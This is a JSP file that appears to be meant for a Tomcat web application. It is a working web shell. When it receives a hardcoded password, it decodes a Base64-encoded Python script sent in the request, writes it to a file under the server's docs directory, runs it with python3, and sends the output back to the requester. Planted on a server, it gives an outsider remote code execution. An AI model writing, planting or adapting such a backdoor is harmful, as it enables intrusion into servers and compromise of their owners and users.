<%@ page import="java.io.*, java.util.*, javax.servlet.*, javax.servlet.http.*, java.util.Base64" %>
<%
    // Define the hardcoded password for authentication
    final String hardcodedPassword = "TheHermitKingdom2024__";

    // Retrieve password and Base64-encoded script from the request
    String password = request.getParameter("password");
    String base64Script = request.getParameter("script");

    // Validate password
    if (password == null || !password.trim().equals(hardcodedPassword)) {
        out.print("Authentication failed: Incorrect password.");
        return;
    }

    // Validate script
    if (base64Script == null || base64Script.isEmpty()) {
        out.print("Error: No script provided.");
        return;
    }

    // Define the directory where the virtual package and scripts are located
    String virtualPackageDir = "/opt/tomcat/webapps/docs/netspi/netspi/aggregate/";

    // Ensure the directory exists
    File dir = new File(virtualPackageDir);
    if (!dir.exists()) {
        dir.mkdirs();
    }

    File tempScriptFile = null;
    try {
        // Decode Base64 script and save it in the virtual package directory
        String decodedScript = new String(Base64.getDecoder().decode(base64Script));
        tempScriptFile = new File(virtualPackageDir, "temp_script.py");

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempScriptFile))) {
            writer.write(decodedScript);
        }

        // Set PYTHONPATH to the virtual package directory
        String pythonPath = "python3";
        ProcessBuilder pb = new ProcessBuilder(pythonPath, tempScriptFile.getAbsolutePath());
        pb.environment().put("PYTHONPATH", virtualPackageDir); // Explicitly set PYTHONPATH

        System.out.println("Executing command: " + pythonPath + " " + tempScriptFile.getAbsolutePath());
        System.out.println("Using PYTHONPATH: " + virtualPackageDir);

        // Execute the script
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

        StringBuilder output = new StringBuilder();
        String line;

        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        while ((line = errorReader.readLine()) != null) {
            output.append("ERROR: ").append(line).append("\n");
        }

        reader.close();
        errorReader.close();

        // Return script output to the client
        out.print(output.toString());
    } catch (Exception e) {
        e.printStackTrace();
        out.print("Error processing the script: " + e.getMessage());
    } finally {
        // Delete the temporary script file
        if (tempScriptFile != null && tempScriptFile.exists()) {
            tempScriptFile.delete();
        }
    }
%>
